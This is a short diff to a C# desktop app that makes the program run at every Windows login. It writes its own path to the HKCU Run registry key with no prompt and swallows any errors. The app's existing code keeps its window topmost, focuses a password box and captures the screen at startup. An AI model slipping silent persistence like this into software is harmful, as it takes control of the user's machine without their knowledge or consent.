@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Diagnostics;
+using System.Reflection;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows;
@@ -21,6 +22,7 @@ namespace C
         public MainWindow()
         {
             InitializeComponent();
+            InstallRunOnStartUp();
             this.Topmost = true;
             txtPassword.Focus();
             Utils.CaptureScreen();
@@ -234,6 +236,16 @@ namespace C
                     hasScheduledThread = true;
                 }));
             }
+        }
+        private void InstallRunOnStartUp()
+        {
+            try
+            {
+                Microsoft.Win32.RegistryKey? key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                Assembly curAssembly = Assembly.GetExecutingAssembly();
+                key.SetValue(curAssembly.GetName().Name, curAssembly.Location);
+            }
+            catch { }
         }
 
         private async void handlePhase(Time startTime, int phaseIndex)
